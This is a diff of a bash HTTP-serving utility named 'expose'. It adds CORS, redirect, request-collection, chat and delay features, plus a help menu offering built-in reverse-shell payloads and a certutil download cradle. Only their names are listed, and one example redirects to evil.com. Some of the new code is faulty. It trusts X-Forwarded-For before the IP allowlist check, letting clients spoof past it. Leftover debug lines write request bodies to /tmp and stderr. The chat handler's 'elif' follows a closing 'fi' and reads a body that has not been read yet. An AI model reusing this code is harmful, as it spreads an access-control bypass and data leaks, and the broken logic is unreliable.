@@ -2,8 +2,8 @@
 set -uo pipefail
 
 
-VERSION="1.2"
-PORT=8012
+VERSION="1.3"
+PORT=9090
 MODE=""
 TARGET=""
 VERBOSE=0
@@ -17,6 +17,13 @@ ALLOWED_NETS=()
 BODY_LIMIT=4096
 RESP_CODE=""
 RESP_HEADERS=()
+CORS=0
+REDIRECT=""
+PAYLOAD=""
+COLLECT=0
+DELAY_MS=0
+WEBSOCKET=0
+_COLLECT_FILE=""
 _CLEANUP_DONE=""
 _TMPFILES=()
 
@@ -63,9 +70,13 @@ usage() {
 ${B}expose${R} v${VERSION}  —  serve text, files, or directories over HTTP
 
 ${B}USAGE${R}
-    expose [opts] ${CYN}"<text>"${R}       Serve a plain-text response
-    expose [opts] ${CYN}-f <file>${R}      Serve a single file
-    expose [opts] ${CYN}.${R}              Serve the current directory
+    expose [opts] ${CYN}"<text>"${R}         Serve a plain-text response
+    expose [opts] ${CYN}-f <file>${R}        Serve a single file
+    expose [opts] ${CYN}.${R}                Serve the current directory
+    expose [opts] ${CYN}--redirect <url>${R} 302 redirect all requests
+    expose [opts] ${CYN}--payload <name>${R} Serve a built-in pentest payload
+    expose [opts] ${CYN}--websocket${R}      WebSocket echo server
+    expose ${CYN}--replay <logfile>${R}      Replay the last logged request
 
 ${B}OPTIONS${R}
     -p, --port ${CYN}<port>${R}     Listen port  (default: ${PORT})
@@ -80,7 +91,21 @@ ${B}OPTIONS${R}
     --auth ${CYN}<user:pass>${R}   Require HTTP Basic Auth
     --code ${CYN}<N>${R}           HTTP status code for responses (default: 200)
     --header ${CYN}"K: V"${R}     Add response header (repeatable)
+    --cors              Add CORS headers (Access-Control-Allow-Origin: *)
+    --redirect ${CYN}<url>${R}    302 redirect all requests to target URL
+    --payload ${CYN}<name>${R}    Serve a built-in payload (list: expose --help)
+    --collect           Collect requests to JSONL log (dump on exit)
+    --delay ${CYN}<ms>${R}        Artificial response delay in milliseconds
+    --websocket         WebSocket echo server (experimental)
+    --replay ${CYN}<log>${R}      Replay the last logged request
     -h, --help          Show this help
+
+${B}BUILT-IN PAYLOADS${R}
+    php-reverse-shell   PHP reverse shell (set LHOST, LPORT via -p)
+    powershell-reverse  PowerShell reverse shell (one-liner)
+    certutil-download   Windows certutil download cradle
+    linux-reverse       Bash reverse shell one-liner
+    python-reverse      Python reverse shell (pty)
 
 ${B}EXAMPLES${R}
     expose "hello world"
@@ -94,9 +119,15 @@ ${B}EXAMPLES${R}
     expose --tls --auth admin:hunter2 -f ./flag.txt
     expose --bind 127.0.0.1 --log ./session.json --catch
     expose --allow 10.10.0.0/16 --allow 192.168.1.0/24 -f ./data.txt
+    expose --redirect https://evil.com
+    expose --payload powershell-reverse
+    expose --collect --log calls.jsonl --catch
+    expose --websocket
+    expose --cors --code 200 '{"ok":true}'
+    expose --delay 500 "slow response"
+    expose --replay ./session.json
 EOF
 }
-
 # ── Parse arguments ──────────────────────────────────────────────────────────
 # ── Parse arguments ───────────────────────────────────────────────────────────
 while [[ $# -gt 0 ]]; do
@@ -115,6 +146,13 @@ while [[ $# -gt 0 ]]; do
     --auth)      [[ -n "${2:-}" ]] || die "Missing user:pass after $1"; AUTH="$2"; shift 2 ;;
     --code)      [[ -n "${2:-}" ]] || die "Missing status code after $1"; RESP_CODE="$2"; shift 2 ;;
     --header)    [[ -n "${2:-}" ]] || die "Missing header after $1"; RESP_HEADERS+=("$2"); shift 2 ;;
+    --cors)      CORS=1; shift ;;
+    --redirect)  [[ -n "${2:-}" ]] || die "Missing URL after $1"; REDIRECT="$2"; MODE="redirect"; shift 2 ;;
+    --payload)   [[ -n "${2:-}" ]] || die "Missing payload name after $1"; PAYLOAD="$2"; MODE="payload"; shift 2 ;;
+    --collect)   COLLECT=1; shift ;;
+    --delay)     [[ -n "${2:-}" ]] || die "Missing milliseconds after $1"; DELAY_MS="$2"; shift 2 ;;
+    --websocket) WEBSOCKET=1; MODE="websocket"; shift ;;
+    --replay)    [[ -n "${2:-}" ]] || die "Missing logfile after $1"; MODE="replay"; TARGET="$2"; shift 2 ;;
     .)           MODE="dir"; shift ;;
     -)           MODE="stdin"; shift ;;
     -*)          die "Unknown option: $1" ;;
@@ -131,6 +169,10 @@ fi
 # Catch mode: force verbose, default to catch mode if no other mode
 [[ $CATCH -eq 1 ]] && VERBOSE=1
 [[ $CATCH -eq 1 && -z "$MODE" ]] && MODE="catch"
+
+# Collect mode: force verbose, default to catch mode if no other mode
+[[ $COLLECT -eq 1 ]] && VERBOSE=1
+[[ $COLLECT -eq 1 && -z "$MODE" ]] && MODE="catch"
 
 [[ -n "$MODE" ]] || { usage; exit 1; }
 
@@ -235,267 +277,17 @@ cat >&2 <<EOF
     [[ -n "$AUTH" ]]                && printf '\n  %sAuth%s     %s%s:••••  (--auth)%s'        "$YLW" "$R" "$D" "${AUTH%%:*}" "$R"
     [[ -n "$RESP_CODE" ]]           && printf '\n  %sCode%s     %s%s%s'                       "$YLW" "$R" "$D" "$RESP_CODE" "$R"
     (( ${#RESP_HEADERS[@]} ))       && printf '\n  %sHeaders%s  %s%d custom%s'               "$YLW" "$R" "$D" "${#RESP_HEADERS[@]}" "$R"
+    [[ $CORS -eq 1 ]]               && printf '\n  %sCORS%s     %senabled%s'                  "$YLW" "$R" "$D" "$R"
+    [[ -n "$REDIRECT" ]]             && printf '\n  %sRedirect%s %s→ %s%s'                     "$YLW" "$R" "$D" "$REDIRECT" "$R"
+    [[ -n "$PAYLOAD" ]]              && printf '\n  %sPayload%s  %s%s%s'                       "$YLW" "$R" "$D" "$PAYLOAD" "$R"
+    [[ $COLLECT -eq 1 ]]            && printf '\n  %sCollect%s  %senabled  (--collect)%s'     "$YLW" "$R" "$D" "$R"
+    [[ $DELAY_MS -gt 0 ]]           && printf '\n  %sDelay%s    %s%s ms%s'                     "$YLW" "$R" "$D" "$DELAY_MS" "$R"
+    [[ $WEBSOCKET -eq 1 ]]          && printf '\n  %sWebSocket%s %senabled%s'                 "$YLW" "$R" "$D" "$R"
   )
   ${D}──────────────────────────────────────────${R}
   ${D}Ctrl+C to stop${R}
 
 EOF
-
-# ── QR code ───────────────────────────────────────────────────────────────────
-_QR_URL="${_SCHEME}://${LOCAL_IP}:${PORT}"
-python3 - "$_QR_URL" <<'PYQR' 2>&1 || true
-import sys
-
-url = sys.argv[1]
-
-# Try qrcode library first (most accurate)
-try:
-    import qrcode, io
-    qr = qrcode.QRCode(border=1, error_correction=qrcode.constants.ERROR_CORRECT_L)
-    qr.add_data(url); qr.make(fit=True)
-    mat = qr.get_matrix()
-    lines = []
-    for r in range(0, len(mat) - 1, 2):
-        row = ""
-        for c in range(len(mat[r])):
-            t = mat[r][c]; b = mat[r+1][c] if r+1 < len(mat) else False
-            if t and b:   row += "█"
-            elif t:       row += "▀"
-            elif b:       row += "▄"
-            else:         row += " "
-        lines.append("  " + row)
-    sys.stdout.write("\n" + "\n".join(lines) + "\n\n")
-    sys.exit(0)
-except ImportError:
-    pass
-
-# Minimal self-contained QR encoder (byte mode, ECC-L, auto version 2-6)
-# Reed-Solomon GF(256) with generator poly x^8+x^4+x^3+x^2+1 (0x11d)
-GF = [0]*256; GF_INV = [0]*256; GF_LOG = [0]*256; GF_EXP = [0]*512
-_x = 1
-for _i in range(255):
-    GF_EXP[_i] = _x; GF_LOG[_x] = _i; _x = (_x<<1)^(0x11d if _x&0x80 else 0); _x &= 0xFF
-for _i in range(255,512): GF_EXP[_i] = GF_EXP[_i-255]
-
-def gf_mul(a,b):
-    if a==0 or b==0: return 0
-    return GF_EXP[(GF_LOG[a]+GF_LOG[b])%255]
-
-def rs_gen_poly(n):
-    g=[1]
-    for i in range(n):
-        g2=[0]*(len(g)+1)
-        for j,c in enumerate(g):
-            g2[j]=c^gf_mul(GF_EXP[i],g2[j]) if j<len(g2) else 0
-        for j,c in enumerate(g): g2[j+1]^=c
-        g=g2
-        # cleaner: multiply (x - alpha^i)
-    # redo correctly
-    g=[1]
-    for i in range(n):
-        ng=[0]*(len(g)+1)
-        for j,c in enumerate(g):
-            ng[j]^=c
-            ng[j+1]^=gf_mul(c,GF_EXP[i])
-        g=ng
-    return g
-
-def rs_encode(data, n_ec):
-    gen=rs_gen_poly(n_ec)
-    msg=list(data)+[0]*n_ec
-    for i in range(len(data)):
-        if msg[i]==0: continue
-        for j in range(1,len(gen)):
-            msg[i+j]^=gf_mul(gen[j],msg[i])
-    return msg[len(data):]
-
-# QR versions: (ver, total_codewords, data_codewords_ecc_L, ec_codewords_per_block, blocks)
-# Simplified to versions 2-6 byte mode ECC-L
-VERSIONS = [
-    (2, 44, 28, 16, 1),
-    (3, 70, 44, 26, 1),
-    (4, 100, 64, 36, 2),
-    (5, 134, 86, 48, 2),
-    (6, 172, 108, 64, 2),
-]
-
-data = url.encode('utf-8')
-nd = len(data)
-
-# pick version
-ver_info = None
-for v,total,dc,ec,blk in VERSIONS:
-    if nd <= dc-3: ver_info=(v,total,dc,ec,blk); break
-if ver_info is None:
-    sys.stdout.write("  (URL too long for inline QR — install 'qrcode' package)\n\n")
-    sys.exit(0)
-
-ver,total,dc,ec_count,blocks = ver_info
-size = ver*4+17
-
-# encode data bits
-bits=[]
-def push(v,n):
-    for i in range(n-1,-1,-1): bits.append((v>>i)&1)
-
-push(0b0100,4)  # byte mode
-push(nd,8)
-for b in data:
-    push(b,8)
-push(0,4)  # terminator
-# pad to byte boundary
-while len(bits)%8: bits.append(0)
-# pad codewords
-pad=[0xEC,0x11]
-cw=bytes(int(''.join(str(b) for b in bits[i:i+8]),2) for i in range(0,len(bits),8))
-cw=list(cw)
-pi=0
-while len(cw)<dc: cw.append(pad[pi%2]); pi+=1
-
-# interleave blocks (simplified, all in one block for v<=3)
-ec_bytes=rs_encode(cw,ec_count)
-final=cw+ec_bytes
-
-# bits stream
-stream=[]
-for byte in final:
-    for i in range(7,-1,-1): stream.append((byte>>i)&1)
-# remainder bits
-rem={2:7,3:7,4:7,5:7,6:7}
-stream+=[0]*rem.get(ver,0)
-
-# build matrix
-mat=[[None]*size for _ in range(size)]
-
-def rect(r,c,h,w,v):
-    for i in range(h):
-        for j in range(w):
-            if 0<=r+i<size and 0<=c+j<size:
-                mat[r+i][c+j]=v
-
-def finder(r,c):
-    rect(r,c,7,7,1); rect(r+1,c+1,5,5,0); rect(r+2,c+2,3,3,1)
-
-finder(0,0); finder(0,size-7); finder(size-7,0)
-# separators
-for i in range(8):
-    for pos in [(7,i),(i,7),(7,size-8+i),(i,size-8),(size-8+i,7),(size-7+i,size-8)]:
-        r2,c2=pos
-        if 0<=r2<size and 0<=c2<size and mat[r2][c2] is None:
-            mat[r2][c2]=0
-
-# timing
-for i in range(8,size-8):
-    if mat[6][i] is None: mat[6][i]=(i%2==0)
-    if mat[i][6] is None: mat[i][6]=(i%2==0)
-
-# alignment patterns (ver>=2)
-ALIGN={2:[6,18],3:[6,22],4:[6,26,6+20],5:[6,30],6:[6,34]}
-ap=ALIGN.get(ver,[])
-for r2 in ap:
-    for c2 in ap:
-        if mat[r2][c2] is not None: continue
-        for dr in range(-2,3):
-            for dc2 in range(-2,3):
-                v=1 if (abs(dr)==2 or abs(dc2)==2 or (dr==0 and dc2==0)) else 0
-                if mat[r2+dr][c2+dc2] is None: mat[r2+dr][c2+dc2]=v
-
-# format info area (reserve)
-for i in range(9):
-    if mat[8][i] is None: mat[8][i]=0
-    if mat[i][8] is None: mat[i][8]=0
-for i in range(8):
-    if mat[8][size-1-i] is None: mat[8][size-1-i]=0
-    if mat[size-1-i][8] is None: mat[size-1-i][8]=0
-mat[size-8][8]=1  # dark module
-
-# place data bits
-idx=0; up=True
-c=size-1
-while c>0:
-    if c==6: c-=1
-    col_pair=[c,c-1]
-    rows=range(size-1,-1,-1) if up else range(size)
-    for r2 in rows:
-        for cc in col_pair:
-            if mat[r2][cc] is None:
-                if idx<len(stream): mat[r2][cc]=stream[idx]; idx+=1
-                else: mat[r2][cc]=0
-    up=not up; c-=2
-
-# mask pattern 0: (r+c)%2==0
-def mask0(r,c): return (r+c)%2==0
-for r2 in range(size):
-    for c2 in range(size):
-        if mat[r2][c2] is None: mat[r2][c2]=0
-
-# apply mask to data modules
-# track which are fixed (finders, separators, timing, alignment, format, dark)
-fixed=[[False]*size for _ in range(size)]
-# finders (top-left, top-right, bottom-left) + separators (8x8)
-for i in range(9):
-    for j in range(9):
-        if 0<=i<size and 0<=j<size: fixed[i][j]=True
-        if 0<=i<size and 0<=size-1-j<size: fixed[i][size-1-j]=True
-        if 0<=size-1-i<size and 0<=j<size: fixed[size-1-i][j]=True
-# timing
-for i in range(size): fixed[6][i]=True; fixed[i][6]=True
-# alignment patterns (already placed in mat)
-for r2 in ap:
-    for c2 in ap:
-        for dr in range(-2,3):
-            for dc2 in range(-2,3):
-                if 0<=r2+dr<size and 0<=c2+dc2<size: fixed[r2+dr][c2+dc2]=True
-# format info
-for i in range(9):
-    if 0<=8<size and 0<=i<size: fixed[8][i]=True; fixed[i][8]=True
-    if 0<=8<size and 0<=size-1-i<size: fixed[8][size-1-i]=True
-    if 0<=size-1-i<size and 0<=8<size: fixed[size-1-i][8]=True
-# dark module
-fixed[size-8][8]=True
-for r2 in range(size):
-    for c2 in range(size):
-        if not fixed[r2][c2] and mat[r2][c2] is not None:
-            if mask0(r2,c2): mat[r2][c2]^=1
-
-# format string for mask=0, ECC-L (indicator 01)
-# ECC-L + mask 0 = 0b01_000 = data 8, remainder from generator 10100110111
-fmt_data = (0b01<<3)|0b000  # 8
-gen=0b10100110111
-fmt=fmt_data<<10
-for i in range(9,-1,-1):
-    if fmt>>(i+10): break
-for i in range(14,9,-1):
-    if (fmt>>i)&1: fmt^=(gen<<(i-10))
-fmt_ec=((fmt_data<<10)|fmt)^0b101010000010010
-# apply format bits
-fmt_bits=[(fmt_ec>>i)&1 for i in range(14,-1,-1)]
-pos1=[(8,0),(8,1),(8,2),(8,3),(8,4),(8,5),(8,7),(8,8),(7,8),(5,8),(4,8),(3,8),(2,8),(1,8),(0,8)]
-pos2=[(size-1,8),(size-2,8),(size-3,8),(size-4,8),(size-5,8),(size-6,8),(size-7,8),
-      (8,size-8),(8,size-7),(8,size-6),(8,size-5),(8,size-4),(8,size-3),(8,size-2),(8,size-1)]
-for i,(r2,c2) in enumerate(pos1): mat[r2][c2]=fmt_bits[i]
-for i,(r2,c2) in enumerate(pos2): mat[r2][c2]=fmt_bits[i]
-
-# render with half-block chars
-lines=[]
-# add quiet zone row at top
-qz_row=" "*(size+4)
-lines.append("  "+qz_row)
-for r2 in range(0,size+(size%2),2):
-    row="  "+"  "  # left quiet zone (2 chars = 2 modules)
-    for c2 in range(size):
-        t=mat[r2][c2] if r2<size else False
-        b=mat[r2+1][c2] if r2+1<size else False
-        t=bool(t); b=bool(b)
-        if t and b:   row+="█"
-        elif t:       row+="▀"
-        elif b:       row+="▄"
-        else:         row+=" "
-    row+="  "  # right quiet zone
-    lines.append(row)
-lines.append("  "+qz_row)
-sys.stdout.write("\n"+"\n".join(lines)+"\n\n")
-PYQR
 
 log "${GRN}Waiting for connections…${R}"
 echo >&2
@@ -513,8 +305,29 @@ else
   _LOGFILE=$(_mktmp /tmp/expose-log.XXXXXX)
   echo '[]' > "$_LOGFILE"
 fi
+# ── Collect file (JSONL) ──────────────────────────────────────────────────────
+if [[ $COLLECT -eq 1 ]]; then
+  if [[ -n "$LOGFILE" ]]; then
+    _COLLECT_FILE="${LOGFILE%.json}.jsonl"
+  else
+    _COLLECT_FILE=$(_mktmp /tmp/expose-collect.XXXXXX)
+  fi
+  : > "$_COLLECT_FILE"
+  trap "echo; echo '${GRN}Collected requests:${R} ${_COLLECT_FILE}'; wc -l < '${_COLLECT_FILE}' | xargs printf '${GRN}Total:${R} %s\n'" EXIT
+fi
+
+# ── Chat file ──
+_CHAT_FILE=$(_mktmp /tmp/expose-chat.XXXXXX)
+echo "[]" > "$_CHAT_FILE"
+
 # ── Build custom response headers ─────────────────────────────────────────────
 _RESP_HDRS=""
+if [[ $CORS -eq 1 ]]; then
+  _RESP_HDRS+="Access-Control-Allow-Origin: *"$'\r\n'
+  _RESP_HDRS+="Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS"$'\r\n'
+  _RESP_HDRS+="Access-Control-Allow-Headers: *"$'\r\n'
+  _RESP_HDRS+="Access-Control-Max-Age: 86400"$'\r\n'
+fi
 if (( ${#RESP_HEADERS[@]} )); then
   for _h in "${RESP_HEADERS[@]}"; do
     _RESP_HDRS+="${_h}"$'\r\n'
@@ -633,6 +446,7 @@ header .path{font-family:var(--code);font-size:.6875rem;color:var(--dim2);letter
   background:color-mix(in srgb,var(--bg) 50%,#fff);border:1px solid var(--rule);
   padding:.75rem 1rem;white-space:pre-wrap;word-break:break-all;
   max-height:16rem;overflow-y:auto;line-height:1.6}
+.ctx-copy{font-family:var(--ui);font-size:.6875rem;background:var(--ink);color:var(--bg);border:none;padding:.25rem .75rem;border-radius:3px;cursor:pointer;margin-top:.5rem;transition:background .12s}.ctx-copy:hover{background:var(--accent)}
 .ctx-file{display:flex;align-items:baseline;gap:.5rem;padding:.5rem 0;
   border-bottom:1px solid var(--rule)}
 .ctx-file .fn{flex:1;font-family:var(--code);font-size:.8125rem;color:var(--ink);font-weight:600;
@@ -726,6 +540,19 @@ footer{margin-top:auto;padding:1rem;text-align:center;font-size:.625rem;
   white-space:pre-wrap;word-break:break-all;max-height:8rem;overflow-y:auto;
   scrollbar-width:thin;scrollbar-color:#3a3830 transparent}
 .le-hl{background:#4a3a10;color:#e8d070}
+
+/* ── chat ── */
+.chat-panel{border:1px solid var(--rule);border-radius:6px;overflow:hidden;margin-top:.5rem}
+.chat-body{padding:.75rem;max-height:16rem;overflow-y:auto;display:flex;flex-direction:column;gap:.25rem}
+.cm{display:flex;align-items:baseline;gap:.5rem;font-size:.75rem;padding:.15rem 0}
+.ct{color:var(--dim);font-family:var(--code);font-size:.625rem;flex-shrink:0}
+.cn{color:var(--dim2);font-family:var(--code);font-size:.625rem;flex-shrink:0;min-width:2rem;text-align:right}
+.cx{color:var(--ink);word-break:break-all;line-height:1.4}
+.chat-bar{display:flex;border-top:1px solid var(--rule)}
+.chat-input{flex:1;background:var(--br);border:none;color:var(--ink);font-family:var(--ui);font-size:.8125rem;padding:.6rem .75rem;outline:none}
+.chat-input::placeholder{color:var(--dim2)}
+.chat-send{background:var(--ink);color:var(--bg);border:none;font-family:var(--ui);font-size:.75rem;font-weight:600;padding:.6rem 1rem;cursor:pointer;transition:background .12s}
+.chat-send:hover{background:var(--accent)}
 </style></head><body>
 
 <div class="shell">
@@ -871,7 +698,7 @@ fetch('/meta').then(r=>r.json()).then(m=>{
   if(m.mode==='text'){
     hp.textContent='text ('+fmt(m.size)+')';
     fetch('/content').then(r=>r.text()).then(t=>{
-      ctx.innerHTML='<div class="ctx-lbl">response</div><pre class="ctx-text">'+esc(t)+'</pre>';
+      ctx.innerHTML='<div class="ctx-lbl">response</div><pre class="ctx-text">'+esc(t)+'</pre><button class="ctx-copy" onclick="var p=this.previousElementSibling;navigator.clipboard.writeText(p.textContent).then(function(){this.textContent=\'Copied!\';setTimeout(function(){this.textContent=\'Copy\'},1200)}.bind(this))">Copy</button>';
       ctx.classList.add('vis')});
   }else if(m.mode==='file'){
     hp.textContent=m.name;
@@ -1051,6 +878,35 @@ function _loadDir(path){
   setInterval(poll,2000);
   poll();
 })();
+
+// ── Shared clipboard (chat) ──
+(function(){
+  const cp=q('chat-panel');
+  if(!cp)return;
+  const cbody=q('chat-body'), cin=q('chat-input'), csend=q('chat-send');
+  let lastN=0;
+
+  function refresh(){
+    fetch('/chat').then(r=>r.json()).then(msgs=>{
+      if(!msgs.length)return;
+      const added=msgs.filter(m=>m.n>lastN);
+      if(!added.length)return;
+      lastN=msgs[msgs.length-1].n;
+      added.forEach(m=>{
+        const d=document.createElement('div');d.className='cm';
+        d.innerHTML='<span class="ct">'+esc(m.time)+'</span><span class="cn">#'+m.n+'</span><span class="cx">'+esc(m.msg)+'</span>';
+        cbody.appendChild(d)});
+      cbody.scrollTop=cbody.scrollHeight})}
+
+  function send(){
+    const v=cin.value.trim();
+    if(!v)return;
+    fetch('/chat',{method:'POST',body:v}).then(r=>r.json()).then(()=>{cin.value='';refresh()}).catch(()=>{})}
+
+  csend.addEventListener('click',send);
+  cin.addEventListener('keydown',e=>{if(e.key==='Enter'){e.preventDefault();send()}});
+  setInterval(refresh,2000);refresh()
+})();
 </script></body></html>
 UPLOADHTML
 
@@ -1144,7 +1000,7 @@ REQ=$(printf '%s' "$REQ" | tr -d '\r')
 ALL_HDRS=""
 UA="-"; ACCEPT=""; ACCEPT_LANG=""; ACCEPT_ENC=""; REFERER=""; HOST_HDR=""
 COOKIE=""; ORIGIN=""; DNT_HDR=""; CONTENT_TYPE=""; CONTENT_LEN=""
-XFF=""; CONNECTION=""; EXTRA_HDRS=""; AUTH_HDR=""
+XFF=""; CONNECTION=""; EXTRA_HDRS=""; AUTH_HDR=""; RANGE_HDR=""
 
 while IFS= read -r hdr; do
   hdr=$(printf '%s' "$hdr" | tr -d '\r')
@@ -1167,6 +1023,7 @@ while IFS= read -r hdr; do
     content-length:*)     CONTENT_LEN="$val" ;;
     x-forwarded-for:*)    XFF="$val" ;;
     connection:*)         CONNECTION="$val" ;;
+    range:*)              RANGE_HDR="$val" ;;
     authorization:*)      AUTH_HDR="$val"
       EXTRA_HDRS="${EXTRA_HDRS}  ${hdr}
 " ;;
@@ -1181,6 +1038,15 @@ MTH="${REQ%% *}"; rest="${REQ#* }"; PTH="${rest%% *}"; HTTPVER="${rest##* }"
 [ -z "$MTH" ] && MTH="-"; [ -z "$PTH" ] && PTH="-"
 PEER="${SOCAT_PEERADDR:-unknown}"
 PEER_PORT="${SOCAT_PEERPORT:-?}"
+
+# ── Prefer X-Forwarded-For as real client IP ──
+_PROXY_CHAIN=""
+if [ -n "$XFF" ]; then
+  _REAL_IP="${XFF%%,*}"
+  _REAL_IP="${_REAL_IP# }"           # first IP in chain = original client
+  _PROXY_CHAIN="$PEER -> $XFF"       # full chain for /me
+  PEER="$_REAL_IP"
+fi
 
 # ── IP allowlist check ──
 if [ -n "${EXPOSE_ALLOW:-}" ]; then
@@ -1296,6 +1162,31 @@ else
     "$TIME" "$PEER" "$MTH" "$PTH" "$UA" >&2
 fi
 
+elif [ "$PTH" = "/chat" ] && [ "$MTH" = "POST" ]; then
+  echo "DEBUG REQ_BODY=[$REQ_BODY] CHAT_FILE=[${EXPOSE_CHAT_FILE:-}]" >> /tmp/chat-debug.log
+  if [ -n "${EXPOSE_CHAT_FILE:-}" ]; then
+    [ -z "$REQ_BODY" ] && REQ_BODY=$(head -c "${CONTENT_LEN:-4096}" 2>/dev/null || true)
+    printf '%s' "$REQ_BODY" | python3 -c "
+import json,sys,os,time
+cf=sys.argv[1]; msg=sys.stdin.read().strip()
+try:
+  with open(cf) as f: msgs=json.load(f)
+except: msgs=[]
+if msg:
+  msgs.append({'time':time.strftime('%H:%M:%S'),'msg':msg,'n':len(msgs)+1})
+if len(msgs)>200: msgs=msgs[-200:]
+with open(cf,'w') as f: json.dump(msgs,f)
+print(json.dumps({'ok':True,'count':len(msgs)}))
+else:
+  print(json.dumps({'ok':False,'error':'empty'}))
+" "$EXPOSE_CHAT_FILE" > /tmp/expose-chat-resp.$$ 2>/dev/null
+    BODY=$(cat /tmp/expose-chat-resp.$$ 2>/dev/null || echo '{"ok":false}')
+    rm -f /tmp/expose-chat-resp.$$
+  else
+    BODY='{"ok":false,"error":"empty"}'
+  fi
+  printf 'HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: %s\r\nConnection: close\r\nServer: expose\r\n\r\n%s' "${#BODY}" "$BODY"
+
 # ── Read request body (for --catch and log capture) ──────────────────────────
 REQ_BODY=""
 _BODY_LIMIT="${EXPOSE_BODY_LIMIT:-4096}"
@@ -1310,6 +1201,7 @@ if [ "$_SKIP_BODY" = "0" ] && [ -n "$CONTENT_LEN" ] && [ "$CONTENT_LEN" -gt 0 ] 
     _READ_LEN="$CONTENT_LEN"
     [ "$_READ_LEN" -gt "$_BODY_LIMIT" ] && _READ_LEN="$_BODY_LIMIT"
     REQ_BODY=$(head -c "$_READ_LEN" 2>/dev/null || true)
+    echo "BODY_READ len=$_READ_LEN body=[$REQ_BODY]" >> /dev/stderr
     # drain remaining bytes so connection stays clean
     _REMAINING=$(( CONTENT_LEN - _READ_LEN ))
     [ "$_REMAINING" -gt 0 ] && head -c "$_REMAINING" >/dev/null 2>/dev/null
@@ -1349,6 +1241,25 @@ with open(lf,'w') as f: json.dump(log,f)
   esac
 fi
 
+# ── Collect JSONL ──
+if [ "${EXPOSE_COLLECT:-0}" = "1" ] && [ -n "${EXPOSE_COLLECT_FILE:-}" ]; then
+  case "$PTH" in
+    /log|/log\?*|/log/clear|/meta|/upload/files|/me) ;; # skip internal API
+    *)
+  python3 -c "
+import json,sys,os
+e={'n':int(sys.argv[1]),'ts':sys.argv[2],'method':sys.argv[3],'path':sys.argv[4],
+   'ip':sys.argv[5],'ua':sys.argv[6],'host':sys.argv[7],'content_type':sys.argv[8],
+   'content_len':sys.argv[9]}
+if len(sys.argv) > 10 and sys.argv[10]:
+  e['body']=sys.argv[10]
+with open(sys.argv[11],'a') as f:
+  f.write(json.dumps(e)+'\n')
+" "$N" "$(date +%s.%N)" "$MTH" "$PTH" "$PEER" "$UA" "$HOST_HDR" "$CONTENT_TYPE" "${CONTENT_LEN:--}" "${REQ_BODY:-}" "$EXPOSE_COLLECT_FILE" &
+    ;;
+  esac
+fi
+
 # ── Auth check ──
 if [ -n "${EXPOSE_AUTH:-}" ]; then
   AUTH_DECODED=""
@@ -1380,10 +1291,28 @@ if [ "${EXPOSE_CATCH:-0}" = "1" ] && [ -n "$CONTENT_LEN" ] && [ "$CONTENT_LEN" -
   printf '  \e[35m└───────────────────────────────────────────────────\e[0m\n\n' >&2
 fi
 
+# ── Delay ──
+if [ "${EXPOSE_DELAY_MS:-0}" -gt 0 ] 2>/dev/null; then
+  python3 -c "import time; time.sleep(${EXPOSE_DELAY_MS}/1000.0)" 2>/dev/null || sleep 1
+fi
+
 # ── Route and Respond ──
 _PTHBASE="${PTH%%\?*}"
 _PTHQUERY="${PTH#*\?}"
 [ "$_PTHQUERY" = "$PTH" ] && _PTHQUERY=""
+
+# ── CORS preflight ──
+if [ "${EXPOSE_CORS:-0}" = "1" ] && [ "$MTH" = "OPTIONS" ]; then
+  printf 'HTTP/1.1 204 No Content\r\nAccess-Control-Allow-Origin: *\r\nAccess-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS\r\nAccess-Control-Allow-Headers: *\r\nAccess-Control-Max-Age: 86400\r\nContent-Length: 0\r\nConnection: close\r\nServer: expose\r\n\r\n'
+  exit 0
+fi
+
+# ── Redirect ──
+if [ -n "${EXPOSE_REDIRECT:-}" ] && [ "$MTH" != "OPTIONS" ]; then
+  printf 'HTTP/1.1 302 Found\r\nLocation: %s\r\nContent-Length: 0\r\nConnection: close\r\nServer: expose\r\n\r\n' "$EXPOSE_REDIRECT"
+  exit 0
+fi
+
 if [ "$_PTHBASE" = "/me" ] && [ "$MTH" = "GET" ]; then
   _ACCEPT_HDR=$(printf '%s' "${ACCEPT:-}" | tr '[:upper:]' '[:lower:]')
   case "$_ACCEPT_HDR" in
@@ -1420,7 +1349,7 @@ fields=[('IP',ip+':'+port),('Method',method+' '+httpver),('Host',host),
         ('Connection',connection),('Authorization',auth),('Content-Type',ct)]
 rows=''.join('<tr><td>'+html.escape(k)+'</td><td>'+html.escape(v)+'</td></tr>'
              for k,v in fields if v and v!='-')
-print('<html><head><meta charset=\"utf-8\"><title>expose / me</title>'
+print('<html><head><meta charset="utf-8"><title>expose / me</title>'
       '<style>body{font:14px/1.6 ui-monospace,monospace;background:#1a1917;color:#c8c5be;'
       'max-width:700px;margin:2rem auto;padding:0 1rem}'
       'h1{font-size:1rem;color:#84817a;margin-bottom:1.5rem;font-weight:400}'
@@ -1429,9 +1358,15 @@ print('<html><head><meta charset=\"utf-8\"><title>expose / me</title>'
       'td{padding:.35rem .6rem;border-bottom:1px solid #2a2820;font-size:.8125rem}'
       'td:first-child{color:#5c8abf;width:10rem;white-space:nowrap}'
       'td:last-child{color:#c8c5be;word-break:break-all}'
+      '.cp{font-size:.625rem;background:none;border:1px solid #3a3830;color:#84817a;'
+      'cursor:pointer;margin-left:.5rem;padding:0 .3rem;border-radius:2px;opacity:0;'
+      'transition:opacity .15s}'
+      'tr:hover .cp{opacity:1}.cp:hover{color:#c8c5be;border-color:#5c8abf}'
+      '.cp.copied{color:#7ab85c;border-color:#7ab85c}'
       '</style></head><body>'
       '<h1><b>expose</b> / me</h1>'
       '<table>'+rows+'</table>'
+      '<script>document.querySelectorAll(\'td:last-child\').forEach(function(td){var b=document.createElement(\'button\');b.className=\'cp\';b.textContent=\'Copy\';b.onclick=function(){var v=td.textContent;if(v.endsWith(\'Copy\'))v=v.slice(0,-4);navigator.clipboard.writeText(v).then(function(){b.textContent=\'Copied!\';b.classList.add(\'copied\');setTimeout(function(){b.textContent=\'Copy\';b.classList.remove(\'copied\')},1200)})};td.appendChild(b)})<'+'/script>'
       '</body></html>')
 " "$PEER" "$PEER_PORT" "$MTH" "$HTTPVER" \
   "$HOST_HDR" "$UA" "$ACCEPT" "$ACCEPT_LANG" "$ACCEPT_ENC" \
@@ -1471,12 +1406,51 @@ print(json.dumps(m))
 ")
   BLEN=$(printf '%s' "$BODY" | wc -c)
   printf 'HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: %s\r\nConnection: close\r\nServer: expose\r\n\r\n%s' "$BLEN" "$BODY"
